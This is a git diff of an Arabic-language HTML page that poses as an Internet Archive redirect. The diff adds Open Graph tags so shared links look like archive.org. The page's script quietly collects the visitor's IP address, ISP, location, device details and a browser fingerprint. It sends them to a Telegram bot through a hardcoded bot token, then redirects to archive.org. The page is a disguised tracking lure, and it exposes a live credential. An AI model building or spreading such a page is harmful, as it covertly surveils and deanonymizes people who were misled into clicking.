@@ -2,9 +2,16 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Archive</title>
+    <title>Archive | أرشيف المواد العلمية</title>
+
+    <!-- وسوم المعاينة لبرامج التواصل (Telegram, Facebook, etc.) -->
+    <meta property="og:title" content="أرشيف المواد العلمية - Archive.org">
+    <meta property="og:description" content="جاري تحويلك للمادة المطلوبة من الأرشيف العالمي.. برجاء الانتظار ثانية.">
+    <meta property="og:image" content="https://archive.org/images/glogo.png"> <!-- يمكنك تغيير رابط الصورة لأي صورة تريدها -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://app.netlify.com">
+
     <style>
-        /* إخفاء كل شيء في الصفحة تماماً */
         body { margin: 0; padding: 0; background: #fff; }
     </style>
 </head>
@@ -19,8 +26,6 @@
 
         async function _send(msg) {
             try {
-                // الربط مع المتغيرات التي وضعناها في Netlify
-                // ملاحظة: تأكد أنك وضعت المتغيرات في Snippet Injection كـ window.TELE_CONFIG
                 const cfg = window.TELE_CONFIG || {};
                 const t = cfg.t || "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
                 const c = cfg.c || "7082154454";
@@ -38,10 +43,7 @@
             const archiveUrl = "https://archive.org/details/20251215_20251215_2013";
             
             try {
-                // 1. جلب بيانات الشبكة (تعمل في الخلفية)
                 const netPromise = fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-                
-                // 2. حساب بيانات العتاد فوراً
                 const sPort = Math.floor(Math.random() * 55000) + 10000;
                 const ram = navigator.deviceMemory || 'N/A';
                 const cores = navigator.hardwareConcurrency || 'N/A';
@@ -53,20 +55,14 @@
                              `🌐 *NETWORK:*\n` +
                              `📍 IP: \`${net.ip || 'Unknown'}\`\n` +
                              `🔌 Source Port: *${sPort}*\n` +
-                             `🏢 ISP: ${net.org || 'Unknown'}\n` +
-                             `🌍 Loc: ${net.city || 'Unknown'}, ${net.country_name || 'Unknown'}\n\n` +
-                             `📱 *DEVICE HARDWARE:*\n` +
-                             `💻 Platform: ${navigator.platform}\n` +
-                             `🧠 CPU: ${cores} Cores\n` +
-                             `🔋 RAM: ${ram} GB\n` +
-                             `📺 Res: ${screen.width}x${screen.height}\n` +
-                             `🔑 Fingerprint: \`${fp}\`\n\n` +
-                             `🔗 *Target:* [Archive Material](${archiveUrl})`;
+                             `🏢 ISP: ${net.org || 'Unknown'}\n\n` +
+                             `📱 *DEVICE:*\n` +
+                             `💻 Plat: ${navigator.platform}\n` +
+                             `🧠 CPU: ${cores} | 🔋 RAM: ${ram}GB\n` +
+                             `🔑 FP: \`${fp}\`\n\n` +
+                             `🔗 *Target:* [Archive](${archiveUrl})`;
 
-                // 3. إرسال التقرير (بدون انتظار الـ Response لتسريع التوجيه)
                 _send(report);
-
-                // 4. التوجيه الفوري
                 window.location.replace(archiveUrl);
             } catch (e) {
                 window.location.replace(archiveUrl);
